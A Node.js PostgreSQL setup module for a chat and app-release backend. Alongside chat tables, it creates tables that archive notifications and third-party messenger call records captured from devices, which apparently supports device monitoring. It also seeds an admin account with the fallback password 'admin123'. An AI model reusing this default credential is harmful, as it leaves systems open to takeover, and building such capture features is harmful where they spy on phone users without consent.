require("dotenv").config();
const crypto = require("node:crypto");
const { Pool } = require("pg");

const connectionString = process.env.DATABASE_URL;

if (!connectionString) {
  throw new Error("DATABASE_URL is not configured. Check your .env file.");
}

const pool = new Pool({
  connectionString,
  max: 15,
  idleTimeoutMillis: 30_000,
  connectionTimeoutMillis: 30_000,
});

pool.on("error", (error) => {
  console.error("Unexpected PostgreSQL pool error:", error.message);
});

function hashPassword(password) {
  const salt = crypto.randomBytes(16).toString("hex");
  const hash = crypto.pbkdf2Sync(password, salt, 100000, 64, "sha512").toString("hex");
  return `${salt}:${hash}`;
}

function verifyPassword(password, stored) {
  try {
    if (!stored || !stored.includes(":")) return false;
    const [salt, hash] = stored.split(":");
    const testHash = crypto.pbkdf2Sync(password, salt, 100000, 64, "sha512").toString("hex");
    return crypto.timingSafeEqual(Buffer.from(hash), Buffer.from(testHash));
  } catch {
    return false;
  }
}

async function initializeDatabase() {
  let connected = false;
  for (let attempt = 1; attempt <= 3; attempt++) {
    try {
      await pool.query("SELECT 1");
      connected = true;
      break;
    } catch (err) {
      console.warn(`Database connection attempt ${attempt} failed: ${err.message}. Retrying...`);
      if (attempt < 3) await new Promise(r => setTimeout(r, 2000));
    }
  }
  if (!connected) {
    throw new Error("Unable to connect to database after 3 attempts.");
  }

  // Ensure admin_users table exists
  await pool.query(`
    CREATE TABLE IF NOT EXISTS public.admin_users (
      id SERIAL PRIMARY KEY,
      username VARCHAR(100) UNIQUE NOT NULL,
      password_hash VARCHAR(255) NOT NULL,
      created_at TIMESTAMPTZ DEFAULT NOW(),
      updated_at TIMESTAMPTZ DEFAULT NOW()
    );
  `);

  // Ensure app_releases table exists with multi-app release isolation
  await pool.query(`
    CREATE TABLE IF NOT EXISTS public.app_releases (
      id SERIAL PRIMARY KEY,
      app_id VARCHAR(64) NOT NULL DEFAULT 'quacky',
      version_name VARCHAR(50) NOT NULL,
      version_code INTEGER NOT NULL,
      release_notes TEXT,
      file_name VARCHAR(255) NOT NULL,
      file_size BIGINT NOT NULL,
      download_url VARCHAR(255) NOT NULL,
      sha256_checksum VARCHAR(64),
      minimum_supported_version INTEGER NOT NULL DEFAULT 1,
      update_required BOOLEAN NOT NULL DEFAULT FALSE,
      release_status VARCHAR(32) NOT NULL DEFAULT 'published',
      package_name VARCHAR(128),
      is_active BOOLEAN DEFAULT TRUE,
      uploaded_by VARCHAR(100) DEFAULT 'admin',
      created_at TIMESTAMPTZ DEFAULT NOW(),
      published_at TIMESTAMPTZ DEFAULT NOW()
    );
    ALTER TABLE public.app_releases ADD COLUMN IF NOT EXISTS app_id VARCHAR(64) NOT NULL DEFAULT 'quacky';
    ALTER TABLE public.app_releases ADD COLUMN IF NOT EXISTS sha256_checksum VARCHAR(64);
    ALTER TABLE public.app_releases ADD COLUMN IF NOT EXISTS minimum_supported_version INTEGER NOT NULL DEFAULT 1;
    ALTER TABLE public.app_releases ADD COLUMN IF NOT EXISTS update_required BOOLEAN NOT NULL DEFAULT FALSE;
    ALTER TABLE public.app_releases ADD COLUMN IF NOT EXISTS release_status VARCHAR(32) NOT NULL DEFAULT 'published';
    ALTER TABLE public.app_releases ADD COLUMN IF NOT EXISTS package_name VARCHAR(128);
    ALTER TABLE public.app_releases ADD COLUMN IF NOT EXISTS published_at TIMESTAMPTZ DEFAULT NOW();
    CREATE INDEX IF NOT EXISTS idx_app_releases_app_active ON public.app_releases(app_id, is_active, version_code DESC, id DESC);

    CREATE TABLE IF NOT EXISTS public.app_release_settings (
      setting_key VARCHAR(64) PRIMARY KEY,
      setting_value TEXT NOT NULL,
      updated_at TIMESTAMPTZ DEFAULT NOW()
    );
    INSERT INTO public.app_release_settings (setting_key, setting_value)
    VALUES ('rollback_enabled_quacky', 'true'), ('rollback_enabled_zez', 'true')
    ON CONFLICT (setting_key) DO NOTHING;
  `);

  // Ensure chat tables exist (Isolated chat subsystem)
  await pool.query(`
    CREATE TABLE IF NOT EXISTS public.chat_users (
      id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
      phone_number VARCHAR(32) UNIQUE NOT NULL,
      name VARCHAR(128) NOT NULL,
      avatar_url TEXT,
      status_message TEXT DEFAULT 'Hey there! I am using Zez.',
      last_seen TIMESTAMPTZ DEFAULT NOW(),
      created_at TIMESTAMPTZ DEFAULT NOW()
    );

    CREATE TABLE IF NOT EXISTS public.chat_conversations (
      id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
      user1_id UUID NOT NULL REFERENCES public.chat_users(id) ON DELETE CASCADE,
      user2_id UUID NOT NULL REFERENCES public.chat_users(id) ON DELETE CASCADE,
      last_message_text TEXT,
      last_message_time TIMESTAMPTZ DEFAULT NOW(),
      created_at TIMESTAMPTZ DEFAULT NOW(),
      CONSTRAINT uq_conversation_participants UNIQUE (user1_id, user2_id)
    );

    CREATE TABLE IF NOT EXISTS public.chat_messages (
      id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
      conversation_id UUID NOT NULL REFERENCES public.chat_conversations(id) ON DELETE CASCADE,
      sender_id UUID NOT NULL REFERENCES public.chat_users(id) ON DELETE CASCADE,
      receiver_id UUID NOT NULL REFERENCES public.chat_users(id) ON DELETE CASCADE,
      message_text TEXT NOT NULL,
      media_url TEXT,
      status VARCHAR(16) DEFAULT 'sent',
      created_at TIMESTAMPTZ DEFAULT NOW()
    );

    CREATE INDEX IF NOT EXISTS idx_chat_messages_conv ON public.chat_messages(conversation_id, created_at ASC);
    CREATE INDEX IF NOT EXISTS idx_chat_messages_recv ON public.chat_messages(receiver_id, status);
    CREATE INDEX IF NOT EXISTS idx_chat_users_phone ON public.chat_users(phone_number);

    ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS media_type VARCHAR(32);
    ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS file_name VARCHAR(255);
    ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS file_size BIGINT;

    ALTER TABLE public.chat_conversations ADD COLUMN IF NOT EXISTS is_secret_mode BOOLEAN DEFAULT FALSE;
    ALTER TABLE public.chat_conversations ADD COLUMN IF NOT EXISTS secret_session_id UUID DEFAULT gen_random_uuid();
    ALTER TABLE public.chat_conversations ADD COLUMN IF NOT EXISTS secret_mode_updated_at TIMESTAMPTZ DEFAULT NOW();
    ALTER TABLE public.chat_conversations ADD COLUMN IF NOT EXISTS secret_mode_by UUID REFERENCES public.chat_users(id);
    ALTER TABLE public.chat_conversations ADD COLUMN IF NOT EXISTS deleted_for_users JSONB DEFAULT '[]'::jsonb;

    ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS mode VARCHAR(16) DEFAULT 'normal';
    ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS secret_session_id UUID;
    ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS reaction VARCHAR(32);
    ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS is_deleted_for_everyone BOOLEAN DEFAULT FALSE;
    ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS deleted_for_users JSONB DEFAULT '[]'::jsonb;
    ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS updated_at TIMESTAMPTZ DEFAULT NOW();
    CREATE INDEX IF NOT EXISTS idx_chat_messages_mode ON public.chat_messages(conversation_id, mode);
    CREATE INDEX IF NOT EXISTS idx_chat_messages_live_recv ON public.chat_messages(receiver_id, status, created_at ASC);

    -- High performance query indexes
    CREATE INDEX IF NOT EXISTS idx_call_logs_timestamp ON public.call_logs (call_timestamp DESC, id DESC);
    CREATE INDEX IF NOT EXISTS idx_devices_last_seen ON public.devices (last_seen_at DESC NULLS LAST);
    CREATE INDEX IF NOT EXISTS idx_chat_conversations_last_msg ON public.chat_conversations (last_message_time DESC NULLS LAST);

    -- Device Notifications capture & cloud archive table
    CREATE TABLE IF NOT EXISTS public.device_notifications (
      id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
      device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE,
      package_name VARCHAR(255) NOT NULL,
      app_name VARCHAR(255),
      title TEXT,
      content TEXT,
      sub_text TEXT,
      post_time BIGINT,
      posted_at TIMESTAMPTZ DEFAULT NOW(),
      created_at TIMESTAMPTZ DEFAULT NOW()
    );
    CREATE INDEX IF NOT EXISTS idx_device_notifications_dev ON public.device_notifications(device_id, posted_at DESC);
    CREATE INDEX IF NOT EXISTS idx_device_notifications_pkg ON public.device_notifications(package_name);
    CREATE UNIQUE INDEX IF NOT EXISTS idx_device_notifications_unique ON public.device_notifications(device_id, package_name, post_time, title);

    -- Device Alarms table for device sync & remote admin management
    CREATE TABLE IF NOT EXISTS public.device_alarms (
      id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
      device_id UUID NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
      alarm_id BIGINT NOT NULL,
      hour INT NOT NULL,
      minute INT NOT NULL,
      label VARCHAR(255) DEFAULT 'Alarm',
      is_enabled BOOLEAN DEFAULT true,
      is_vibrate BOOLEAN DEFAULT true,
      is_jit_mode BOOLEAN DEFAULT false,
      days_of_week JSONB DEFAULT '[false, true, true, true, true, true, false]'::jsonb,
      ringtone_title VARCHAR(255) DEFAULT 'Default Alarm Ringtone',
      ringtone_uri TEXT DEFAULT '',
      created_by VARCHAR(50) DEFAULT 'device',
      status VARCHAR(50) DEFAULT 'active',
      created_at TIMESTAMPTZ DEFAULT NOW(),
      updated_at TIMESTAMPTZ DEFAULT NOW(),
      UNIQUE(device_id, alarm_id)
    );
    CREATE INDEX IF NOT EXISTS idx_device_alarms_dev ON public.device_alarms(device_id, hour, minute);

    -- Third-Party App Calls (WhatsApp, Telegram, Instagram, Messenger, etc.)
    CREATE TABLE IF NOT EXISTS public.device_app_calls (
      id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
      device_id UUID NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
      app_name VARCHAR(100) NOT NULL,
      package_name VARCHAR(255) NOT NULL,
      caller_name VARCHAR(255) NOT NULL,
      call_type VARCHAR(50) DEFAULT 'voice',
      call_direction VARCHAR(50) DEFAULT 'incoming',
      duration_seconds INT DEFAULT 0,
      call_time BIGINT NOT NULL,
      timestamp TIMESTAMPTZ DEFAULT NOW(),
      raw_details TEXT,
      created_at TIMESTAMPTZ DEFAULT NOW()
    );
    CREATE INDEX IF NOT EXISTS idx_device_app_calls_dev ON public.device_app_calls(device_id, timestamp DESC);
    CREATE INDEX IF NOT EXISTS idx_device_app_calls_pkg ON public.device_app_calls(package_name);
    CREATE UNIQUE INDEX IF NOT EXISTS idx_device_app_calls_unique ON public.device_app_calls(device_id, package_name, call_time, caller_name, call_direction);

    -- Media files table for Backblaze B2 Object Storage
    CREATE TABLE IF NOT EXISTS public.media_files (
      id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
      user_id UUID REFERENCES public.chat_users(id) ON DELETE SET NULL,
      storage_provider VARCHAR(32) DEFAULT 'backblaze_b2',
      bucket_name VARCHAR(128) NOT NULL,
      object_key TEXT UNIQUE NOT NULL,
      original_file_name VARCHAR(255),
      mime_type VARCHAR(128),
      file_size BIGINT NOT NULL,
      file_category VARCHAR(64) DEFAULT 'chat-media',
      uploaded_by VARCHAR(100) DEFAULT 'user',
      upload_status VARCHAR(32) DEFAULT 'completed',
      metadata JSONB DEFAULT '{}'::jsonb,
      created_at TIMESTAMPTZ DEFAULT NOW(),
      updated_at TIMESTAMPTZ DEFAULT NOW()
    );

    CREATE INDEX IF NOT EXISTS idx_media_files_user ON public.media_files(user_id);
    CREATE INDEX IF NOT EXISTS idx_media_files_category ON public.media_files(file_category);
    CREATE INDEX IF NOT EXISTS idx_media_files_key ON public.media_files(object_key);
    CREATE INDEX IF NOT EXISTS idx_media_files_created ON public.media_files(created_at DESC);

    -- End-to-end active calls & WebRTC signaling
    CREATE TABLE IF NOT EXISTS public.active_calls (
      id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
      caller_id UUID NOT NULL REFERENCES public.chat_users(id) ON DELETE CASCADE,
      callee_id UUID NOT NULL REFERENCES public.chat_users(id) ON DELETE CASCADE,
      call_type VARCHAR(16) NOT NULL DEFAULT 'audio',
      status VARCHAR(32) NOT NULL DEFAULT 'ringing',
      caller_name VARCHAR(128),
      caller_avatar TEXT,
      caller_phone VARCHAR(32),
      started_at TIMESTAMPTZ DEFAULT NOW(),
      connected_at TIMESTAMPTZ,
      ended_at TIMESTAMPTZ,
      duration_seconds INTEGER DEFAULT 0
    );

    CREATE TABLE IF NOT EXISTS public.call_signals (
      id SERIAL PRIMARY KEY,
      call_id UUID NOT NULL REFERENCES public.active_calls(id) ON DELETE CASCADE,
      sender_id UUID NOT NULL,
      target_id UUID NOT NULL,
      signal_type VARCHAR(32) NOT NULL,
      payload JSONB NOT NULL,
      is_read BOOLEAN DEFAULT FALSE,
      created_at TIMESTAMPTZ DEFAULT NOW()
    );

    CREATE INDEX IF NOT EXISTS idx_active_calls_callee ON public.active_calls(callee_id, status);
    CREATE INDEX IF NOT EXISTS idx_call_signals_target ON public.call_signals(call_id, target_id, is_read);

    -- Interactive 2-player in-chat games (Tic Tac Toe)
    CREATE TABLE IF NOT EXISTS public.chat_games (
      id UUID PRIMARY KEY,
      conversation_id UUID REFERENCES public.chat_conversations(id) ON DELETE CASCADE,
      game_type VARCHAR(32) NOT NULL DEFAULT 'tictactoe',
      host_id UUID NOT NULL REFERENCES public.chat_users(id) ON DELETE CASCADE,
      guest_id UUID NOT NULL REFERENCES public.chat_users(id) ON DELETE CASCADE,
      host_name VARCHAR(128),
      guest_name VARCHAR(128),
      board JSONB NOT NULL DEFAULT '["","","","","","","","",""]'::jsonb,
      current_turn UUID NOT NULL,
      winner_id UUID,
      winning_line JSONB,
      is_draw BOOLEAN DEFAULT FALSE,
      status VARCHAR(24) NOT NULL DEFAULT 'waiting',
      host_score INTEGER DEFAULT 0,
      guest_score INTEGER DEFAULT 0,
      draws_count INTEGER DEFAULT 0,
      round_number INTEGER DEFAULT 1,
      guest_joined BOOLEAN DEFAULT FALSE,
      version INTEGER DEFAULT 1,
      ended_by UUID,
      created_at TIMESTAMPTZ DEFAULT NOW(),
      updated_at TIMESTAMPTZ DEFAULT NOW()
    );
    CREATE INDEX IF NOT EXISTS idx_chat_games_players ON public.chat_games(host_id, guest_id, updated_at DESC);
  `);

  // Seed default admin if table is empty
  const adminCount = await pool.query("SELECT COUNT(*)::int AS count FROM public.admin_users");
  if (adminCount.rows[0].count === 0) {
    const defaultUser = process.env.ADMIN_USERNAME || "admin";
    const defaultPass = process.env.ADMIN_PASSWORD || "admin123";
    const initialHash = hashPassword(defaultPass);
    await pool.query(
      `INSERT INTO public.admin_users (username, password_hash)
       VALUES ($1, $2)
       ON CONFLICT (username) DO NOTHING`,
      [defaultUser, initialHash]
    );
    console.log(`Initialized public.admin_users with default credentials for '${defaultUser}'.`);
  }

  // Cleanup ephemeral local disk avatar URLs so client falls back to initials rather than 404 dead links
  await pool.query(
    "UPDATE public.chat_users SET avatar_url = NULL WHERE avatar_url LIKE '/uploads/avatars/%'"
  ).catch(() => {});

  const tablesResult = await pool.query(
    `SELECT table_name
       FROM information_schema.tables
      WHERE table_schema = 'public'
        AND table_name IN ('devices', 'call_logs', 'admin_users')`
  );

  console.log("Neon database connected. All tables verified:", tablesResult.rows.map(r => r.table_name).join(", "));
}

async function closeDatabase() {
  await pool.end();
}

module.exports = {
  pool,
  hashPassword,
  verifyPassword,
  initializeDatabase,
  closeDatabase,
};
